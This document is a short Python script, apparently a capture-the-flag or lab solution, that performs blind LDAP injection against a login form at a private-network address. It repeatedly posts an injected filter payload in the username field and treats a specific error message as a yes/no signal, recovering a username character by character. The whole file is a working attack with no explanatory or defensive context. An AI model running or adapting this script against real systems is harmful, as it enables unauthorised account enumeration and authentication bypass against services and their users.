import requests
from string import ascii_lowercase, ascii_uppercase, digits



url = 'http://10.10.64.137/blind.php'

header = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

def send_data(input_data):
    response = requests.post(url, data=input_data, headers=header)
    text = response.text

    if 'Something is wrong in your password.' in text:
        return True
    else:
        return False


chars_to_check = ascii_lowercase + ascii_uppercase + digits + '._!@#$%^&*()'


length_of_chars = len(chars_to_check)

user = ''

while True:
    count = 0

    for char in chars_to_check:
        count += 1
            
        data = f"username={user}{char}*)(|(%26&password=pwd)"

        if send_data(data):
            user += char

            break
    
    if count == length_of_chars:
        break

print(user)
